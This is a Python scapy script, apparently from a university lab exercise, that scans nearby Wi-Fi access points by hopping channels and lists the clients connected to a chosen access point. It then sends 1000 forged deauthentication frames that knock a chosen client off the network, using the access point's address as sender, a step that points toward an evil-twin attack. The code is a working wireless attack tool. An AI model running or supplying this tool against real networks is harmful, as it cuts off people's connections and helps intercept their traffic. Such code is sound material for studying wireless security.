from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.config import conf
from threading import Thread
import pandas
import time
import pdb
import os

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

isSniffing = True

bssid_to_scan = ''
clients = set()


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except Exception as e:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def print_APs():
    while isSniffing:
        os.system("clear")
        print(networks)
        time.sleep(0.5)


def print_scanned_clients():
    while True:
        os.system("clear")
        print(clients)
        time.sleep(1)


def change_channel():
    ch = 1
    while isSniffing:
        os.system(f"iwconfig {conf.iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


def get_AP_clients(pkt):
    if pkt.haslayer(Dot11):
        client_mac = ''
        if pkt.type == 2:
            from_ds = pkt[Dot11].FCfield & 0x1 != 0
            to_ds = pkt[Dot11].FCfield & 0x2 != 0
            if to_ds and not from_ds and pkt.addr2 == bssid_to_scan:
                client_mac = pkt.addr1
            if from_ds and not to_ds and pkt.addr1 == bssid_to_scan:
                client_mac = pkt.addr2
            if client_mac:
                clients.add(client_mac)


def deauth_target(target_mac, twin_mac):
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=twin_mac, addr3=twin_mac)
    pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(pkt, inter=0.1, count=1000, iface=conf.iface, verbose=1)


if __name__ == "__main__":
    # interface name, check using iwconfig
    conf.iface = "wlxc83a35c2e0bb"
    # start the thread that prints all the networks
    printer = Thread(target=print_APs)
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.start()
    print("Start scanning networks")
    # start sniffing
    sniff(prn=callback, monitor=True, timeout=10)
    isSniffing = False

    # bssid_to_scan = networks[networks["SSID"] == "Ariel-University-2.4"].index[0]
    print("Enter mac address of AP to sacn")
    bssid_to_scan = input()

    print(f'Start scanning clients on {bssid_to_scan}')
    sniff(prn=get_AP_clients, monitor=True, stop_filter=lambda x: len(clients) > 0, timeout=120)

    print(f"clients connected to the AP you choose: {clients}")

    target_mac = input("Enter target mac: ")
    deauth_target(target_mac, bssid_to_scan)

    pdb.set_trace()
